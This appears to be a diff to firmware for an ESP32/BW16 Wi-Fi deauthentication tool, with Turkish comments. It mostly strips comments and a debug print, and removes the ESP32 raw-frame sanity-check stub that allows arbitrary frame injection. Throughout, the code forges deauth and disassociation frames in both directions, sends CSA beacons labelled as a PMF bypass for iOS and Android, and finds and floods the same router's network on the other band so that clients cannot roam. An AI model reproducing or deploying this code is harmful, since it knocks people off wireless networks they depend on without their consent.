@@ -22,29 +22,21 @@ uint8_t deauth_target2_bssid[6]   = {0};
 int     deauth_target2_channel    = 1;
 char    deauth_target2_ssid[33]   = {0};
 
-// ─── Düşük seviye bağımlılıklar (yalnızca ESP32) ─────────────────────────────
-#ifndef BOARD_BW16
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }
-#endif
-
 // ─── Forward declaration ──────────────────────────────────────────────────────
 static void sniffer_cb(const uint8_t *frame, uint16_t len);
 
 // ─── Yardımcı: aynı modeme ait eşlikçi bant ağını bul ────────────────────────
-// Kriter: OUI eşleşmesi (BSSID ilk 3 byte) + farklı bant
 static int find_companion_network(const uint8_t *primary_bssid, int primary_ch) {
   bool primary_5g = IS_5GHZ_CHANNEL(primary_ch);
   for (int i = 0; i < num_networks; i++) {
     int ch = WiFi_channel_scan(i);
-    if (IS_5GHZ_CHANNEL(ch) == primary_5g) continue; // aynı bant, atla
-    if (memcmp(primary_bssid, WiFi_BSSID_scan(i), 3) == 0) return i; // OUI eşleşti
+    if (IS_5GHZ_CHANNEL(ch) == primary_5g) continue;
+    if (memcmp(primary_bssid, WiFi_BSSID_scan(i), 3) == 0) return i;
   }
   return -1;
 }
 
 // ─── Yardımcı: eşlikçi BSSID'den mevcut kanalda deauth inject ────────────────
-// Kanal değiştirmeden, eşlikçi AP'miş gibi sahte deauth çerçeveleri gönderir.
-// Hem hedef istemci adresine hem broadcast'e gönderilir.
 IRAM_ATTR static void inject_companion_deauth(const uint8_t *sta_mac) {
   if (!deauth_has_companion) return;
   static const uint8_t reasons[4] = {7, 6, 2, 3};
@@ -53,7 +45,6 @@ IRAM_ATTR static void inject_companion_deauth(const uint8_t *sta_mac) {
   memcpy(f2.sender,       deauth_target2_bssid, 6);
   memcpy(f2.station,      sta_mac, 6);
 
-  // Yön 1: eşlikçi AP → istemci
   for (int r = 0; r < 4; r++) {
     f2.frame_control[0] = 0xC0; f2.reason = reasons[r];
     for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
@@ -63,7 +54,6 @@ IRAM_ATTR static void inject_companion_deauth(const uint8_t *sta_mac) {
       hal_wifi_80211_tx(HAL_IF_AP, &f2, sizeof(f2));
   }
 
-  // Yön 2: istemci → eşlikçi AP spoof
   deauth_frame_t f2_rev = make_deauth_frame();
   memcpy(f2_rev.access_point, deauth_target2_bssid, 6);
   memcpy(f2_rev.sender,       sta_mac, 6);
@@ -73,7 +63,6 @@ IRAM_ATTR static void inject_companion_deauth(const uint8_t *sta_mac) {
   f2_rev.frame_control[0] = 0xA0; f2_rev.reason = 8;
   for (int i = 0; i < 8; i++) hal_wifi_80211_tx(HAL_IF_AP, &f2_rev, sizeof(f2_rev));
 
-  // Broadcast eşlikçi deauth
   memset(f2.station, 0xFF, 6);
   f2.frame_control[0] = 0xC0; f2.reason = 3;
   for (int i = 0; i < 6; i++) hal_wifi_80211_tx(HAL_IF_AP, &f2, sizeof(f2));
@@ -82,7 +71,6 @@ IRAM_ATTR static void inject_companion_deauth(const uint8_t *sta_mac) {
 }
 
 // ─── CSA Beacon (iOS / Android PMF bypass) ───────────────────────────────────
-// Hem birincil hem eşlikçi bant için CSA beacon gönderir.
 static void _send_csa_for(const uint8_t *bssid, const char *ssid, int channel) {
   uint8_t  ssid_len = (uint8_t)strnlen(ssid, 32);
   uint8_t  ch       = (uint8_t)channel;
@@ -134,10 +122,8 @@ static void _send_csa_for(const uint8_t *bssid, const char *ssid, int channel) {
 IRAM_ATTR void send_csa_beacon() {
   if (deauth_type != DEAUTH_TYPE_SINGLE) return;
 
-  // Birincil kanal CSA
   _send_csa_for(deauth_frame.access_point, deauth_target_ssid, deauth_target_channel);
 
-  // Eşlikçi bant CSA: kanalda deauth_target2 kanalına hop et, CSA gönder, geri dön
   if (deauth_has_companion) {
     hal_wifi_set_promiscuous(false);
     hal_wifi_set_channel(deauth_target2_channel);
@@ -198,7 +184,6 @@ IRAM_ATTR static void sniffer_cb(const uint8_t *frame, uint16_t len) {
     if (memcmp(hdr->dest, deauth_frame.sender, 6) != 0) return;
     memcpy(deauth_frame.station, hdr->src, 6);
 
-    // Yön 1: AP → Station (birincil bant)
     for (int r = 0; r < 4; r++) {
       deauth_frame.frame_control[0] = 0xC0;
       deauth_frame.reason = reasons[r];
@@ -210,7 +195,6 @@ IRAM_ATTR static void sniffer_cb(const uint8_t *frame, uint16_t len) {
         hal_wifi_80211_tx(HAL_IF_AP, &deauth_frame, sizeof(deauth_frame));
     }
 
-    // Yön 2: Station → AP spoof (birincil bant)
     {
       deauth_frame_t f_rev = make_deauth_frame();
       memcpy(f_rev.access_point, deauth_frame.access_point, 6);
@@ -224,11 +208,9 @@ IRAM_ATTR static void sniffer_cb(const uint8_t *frame, uint16_t len) {
         hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));
     }
 
-    // Auth confusion + NULL power-save
     send_auth_confusion(deauth_frame.access_point, hdr->src);
     send_null_powerdown(deauth_frame.access_point, hdr->src);
 
-    // Broadcast DEAUTH + DISASSOC (birincil bant)
     memset(deauth_frame.station, 0xFF, 6);
     deauth_frame.frame_control[0] = 0xC0; deauth_frame.reason = 3;
     for (int i = 0; i < 6; i++)
@@ -237,9 +219,6 @@ IRAM_ATTR static void sniffer_cb(const uint8_t *frame, uint16_t len) {
     for (int i = 0; i < 6; i++)
       hal_wifi_80211_tx(HAL_IF_AP, &deauth_frame, sizeof(deauth_frame));
 
-    // ── Çift bant: eşlikçi BSSID'den de deauth inject (mevcut kanalda) ──────
-    // İstemci aynı kanalda olduğu için eşlikçi AP'den gelmiş gibi gören deauth
-    // çerçeveleri de alır → roaming girişimi engellenir.
     inject_companion_deauth(hdr->src);
 
     memcpy(deauth_frame.station, hdr->src, 6);
@@ -294,9 +273,6 @@ IRAM_ATTR static void sniffer_cb(const uint8_t *frame, uint16_t len) {
 }
 
 // ─── Periyodik eşlikçi bant deauth patlaması ──────────────────────────────────
-// main loop'tan ~2 saniyede bir çağrılır.
-// Eşlikçi kanalına (örn. 5GHz) geçer, broadcast deauth patlatır, geri döner.
-// Birincil kanalda takılı kalmayan istemcileri de etkisiz kılar.
 void send_companion_deauth_burst() {
   if (!deauth_has_companion || deauth_type != DEAUTH_TYPE_SINGLE) return;
 
@@ -308,7 +284,6 @@ void send_companion_deauth_burst() {
   memcpy(f.access_point, deauth_target2_bssid, 6);
   memcpy(f.sender,       deauth_target2_bssid, 6);
 
-  // Broadcast deauth — tüm istemcilere
   static const uint8_t reasons[] = {7, 6, 2, 3};
   memset(f.station, 0xFF, 6);
   for (int r = 0; r < 4; r++) {
@@ -318,7 +293,6 @@ void send_companion_deauth_burst() {
     for (int i = 0; i < 8; i++)  hal_wifi_80211_tx(HAL_IF_AP, &f, sizeof(f));
   }
 
-  // Eşlikçi kanalda CSA beacon da gönder
   _send_csa_for(deauth_target2_bssid,
                 deauth_target2_ssid[0] ? deauth_target2_ssid : deauth_target_ssid,
                 deauth_target2_channel);
@@ -352,7 +326,6 @@ void retrack_deauth_target() {
   for (int i = 0; i < n; i++) {
     const char *ssid = WiFi_SSID_cstr(i);
 
-    // Birincil hedef: BSSID OUI + SSID eşleşmesi
     if (!found_primary &&
         strcmp(ssid, deauth_target_ssid) == 0 &&
         memcmp(WiFi_BSSID_scan(i), deauth_target_bssid, 3) == 0) {
@@ -376,7 +349,6 @@ void retrack_deauth_target() {
       found_primary = true;
     }
 
-    // Eşlikçi hedef: OUI eşleşmesi + farklı bant
     if (!found_companion && deauth_has_companion &&
         memcmp(deauth_target_bssid, WiFi_BSSID_scan(i), 3) == 0 &&
         IS_5GHZ_CHANNEL(WiFi_channel_scan(i)) != IS_5GHZ_CHANNEL(deauth_target_channel)) {
@@ -420,7 +392,6 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
     memcpy(deauth_frame.access_point, deauth_target_bssid, 6);
     memcpy(deauth_frame.sender,       deauth_target_bssid, 6);
 
-    // ── Çift bant eşlikçi tespiti ────────────────────────────────────────────
     int comp_idx = find_companion_network(deauth_target_bssid, deauth_target_channel);
     if (comp_idx >= 0) {
       deauth_has_companion      = true;
@@ -428,11 +399,9 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
       memcpy(deauth_target2_bssid, WiFi_BSSID_scan(comp_idx), 6);
       strncpy(deauth_target2_ssid, WiFi_SSID_cstr(comp_idx), 32);
       deauth_target2_ssid[32] = '\0';
-      DEBUG_PRINTF("Cift bant tespit edildi! Eslıkci: kanal %d %s BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+      DEBUG_PRINTF("Cift bant tespit edildi! Eslıkci: kanal %d %s\n",
         deauth_target2_channel,
-        IS_5GHZ_CHANNEL(deauth_target2_channel) ? "(5GHz)" : "(2.4GHz)",
-        deauth_target2_bssid[0], deauth_target2_bssid[1], deauth_target2_bssid[2],
-        deauth_target2_bssid[3], deauth_target2_bssid[4], deauth_target2_bssid[5]);
+        IS_5GHZ_CHANNEL(deauth_target2_channel) ? "(5GHz)" : "(2.4GHz)");
     }
 
     DEBUG_PRINT("Deauth baslatiyor: ");
@@ -447,10 +416,6 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
     apply_max_performance();
   } else {
     DEBUG_PRINTLN("Tum aglara deauth (2.4+5GHz)...");
-#ifndef BOARD_BW16
-    WiFi.softAPdisconnect();
-    WiFi.mode(WIFI_MODE_STA);
-#endif
     delay(100);
     apply_max_performance();
   }
